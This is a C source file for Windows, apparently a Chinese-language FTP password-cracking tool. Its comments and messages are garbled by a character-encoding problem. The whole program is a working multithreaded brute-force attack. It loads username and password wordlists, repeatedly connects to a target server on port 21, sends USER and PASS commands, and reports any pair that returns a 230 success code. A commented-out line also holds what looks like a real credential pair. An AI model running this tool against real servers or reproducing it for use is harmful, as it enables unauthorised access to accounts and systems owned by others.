 /***********************************

  ���ֳ�����ʲô���⣬��ӭ��ϵ�ҡ�
        ��ʲô��Ҫ�ĵ�Ҳ���Խ�����
        ϣ���ܸ���Ҷ�ཻ����
                QQ:841116165

 *************************************/
#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include <malloc.h>
#include <string.h>
#pragma comment(lib,"ws2_32.lib")
#define USER "users.txt"
#define DIC "pass.txt"

char inurl[100]="";
int nThread=0;
int MaxThread=300;
char user[50]="",pass[50]="";

char *userh, *passh, *userp, *passp;

//�����ֵ�
char * LoadFile(char *file)
{
        char *hdic=0;
        int num=0;
        FILE *fr = fopen(file,"rb");
        if (fr==NULL)
        {
                return 0;
        }
        fseek(fr,0,SEEK_END);
        num = ftell(fr);
        hdic = (char*)malloc(sizeof(char)*(num+10));
        strnset(hdic, '\0', num+10);
        //��λ�ļ�ָ��
        rewind(fr);
        //�����ڴ�
        fread(hdic,num,1,fr);
        //�ر��ļ�ָ��
        fclose(fr);
        if (hdic == NULL) return 0;
        return hdic;
}


int CheckLogin()
{
        WSADATA ws;
        SOCKET s;
        char usert[20]="",passt[20]="";
        char sendbuf[BUFSIZ]="",recvbuf[BUFSIZ]="",result[100]="";
        struct sockaddr_in sa;
        struct hostent* url;
        WSAStartup(MAKEWORD(1,1),&ws);
        strcpy(usert,user);
        strcpy(passt,pass);
        printf("\n���ڳ���:%s\\%s\t\tʵ�ʴ�����%d���߳�.....",usert,passt, nThread);
        s = socket(AF_INET,SOCK_STREAM, 0);
        
        url = gethostbyname(inurl);
        
        //        printf("connect:%s\n",inet_ntoa(*((struct in_addr *)url->h_addr)));
        sa.sin_addr.S_un.S_addr = inet_addr(inet_ntoa(*((struct in_addr *)url->h_addr)));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(21);
        
        if (SOCKET_ERROR==connect(s, (struct sockaddr*)&sa, sizeof(sa)))
        {
                printf("\n=Connect Error=");
                return 0;
        }
        
        
        //��֯ftpЭ���½����
        strcat(sendbuf,"user ");
        strcat(sendbuf,usert);
        strcat(sendbuf,"\r\n");
        //��������ftp����������Ӧ
        recv(s,recvbuf, BUFSIZ, 0);
        //        printf("SEND:%s\n",sendbuf);
        //�����û���
        send(s,sendbuf,strlen(sendbuf),0);
        
        recv(s,recvbuf, BUFSIZ, 0);
        
        //        printf("RECV:%s\n",recvbuf);
        
        strnset(recvbuf, 0, BUFSIZ);
        
        strnset(sendbuf,0,BUFSIZ);
        
        strcat(sendbuf,"pass ");
        strcat(sendbuf,passt);
        strcat(sendbuf,"\r\n\r\n");
        //        printf("SEND:%s\n",sendbuf);
        //�����������ݰ�
        send(s,sendbuf,strlen(sendbuf),0);
        
        recv(s,recvbuf, BUFSIZ, 0);
        //        printf("%s\n",recvbuf);
        //��½�ɹ�����230
        printf("\n�� �� ��:%s\\%s\t",usert,passt);
        if(strncmp(recvbuf,"230",3)==0)
        {
                send(s,"quit\r\n\r\n", 8,0);
                recv(s,recvbuf, BUFSIZ, 0);
                
                //        printf("RECV:%s\n",recvbuf);
                //��������ʾ����Ļ��
                sprintf(result, "\n\n\t\t\t��ϲ��\n\n\t\t�û���:%s\n\t\t����:%s\n\n",usert,passt);
                nThread=-100;
        
                system("color 4f&cls");
                printf("%s",result);
                
                
        }
        send(s,"quit\r\n\r\n", 8,0);
        recv(s,recvbuf, BUFSIZ, 0);
        
        //        printf("RECV:%s\n",recvbuf);
        closesocket(s);
        WSACleanup();
        
        return 0;
}

DWORD WINAPI ThreadCheckUser(LPVOID pParam)
{
        if(nThread <0) return 0;
        nThread+=1;
        
        CheckLogin();
        nThread-=1;
        return 0;
        
}

void usage()
{
        system("cls");
        printf("\n\t��������:�ƺڿ�ftp�ƽ���v1.0\n\n\t\t\t�÷�ʾ��: \n\t\tsiftp.exe www.zixue7.com 500\n\t\tsiftp.exe www.zixue7.com 1000\n\t\tsiftp.exe www.zixue7.com\n\t\twww.zixue7.com������½��ftp��������ַ.\n\t\t500���߳���,��������߳�ѡ�Ĭ��Ϊ300\n\n\t\t\t\t\t\tBY:�ƺڿ�ѧԺ���С��\n");
}

int main(int argc, char *argv[])
{
        
        
        int n=0;  //��¼�û��������ַ�������
        
        
        DWORD threadId=0;
        char title[100]="";
        system("color 0e&title �ƺڿ�ftp�ƽ���v1.0 - www.sihack.com");
        if(argc != 2 && argc != 3)
        {
                usage();
                system("pause");
                return 0;
        }
        else
        {
                strcpy(inurl, argv[1]);
                argc>=3?MaxThread = atoi(argv[2]):0;

        //        printf("----------%d----------",atoi(argv[2]));
        //        if(strlen(argv[2]) > 0 && strlen(argv[2])<5) MaxThread = );
        }
        sprintf(title,"title �����ƽ� %s %d - ��ѧȥ-��ѧ���-www.zixue7.com",argv[1],MaxThread);
        system(title);
        //���ֵ���ص��ڴ�
        if((userp=LoadFile(USER))==0)
        {
                printf("%s�ļ�����ʧ��\n",USER);
                return 0;
        }
        if((passp=LoadFile(DIC))==0)
        {
                printf("%s�ļ�����ʧ��\n",DIC);
                return 0;
        }
        
        userh = userp;
        do
        {
                passh = passp;
                for (n=0; *userh != '\n' && *userh != '\0'; ++userh,++n);
                strnset(user, 0, 50);
                strncpy(user, userh-n, *userh == '\0'?n:n-1);
                userh++;
                //        printf("%s",user);
                do
                {
                        for (n=0; *passh != '\n' && *passh != '\0'; ++passh,++n);
                        strnset(pass, 0, 50);
                        strncpy(pass, passh-n, *passh == '\0'?n:n-1);
                        passh++;
                        //        printf("%s",pass);
                        CreateThread(NULL, 0, ThreadCheckUser,NULL, 0, &threadId);
                        Sleep(50);
                        if(nThread <0){
                                return 0;
                        }
loop:
                        if(nThread > MaxThread)
                        {
                                Sleep(500);
                                goto loop;
                        }
                        
                        //        if(CheckLogin()) return 0;
                }while(*passh != '\0');
        }while(*userh != '\0');
        
        while(nThread>0)
        {
                Sleep(1000);
        }
        //CheckLogin("niaoniao","admin841116165");
        printf("\n\n���ź�,û�в½⵽��\n");
        system("color 8f");
        return 0;
}

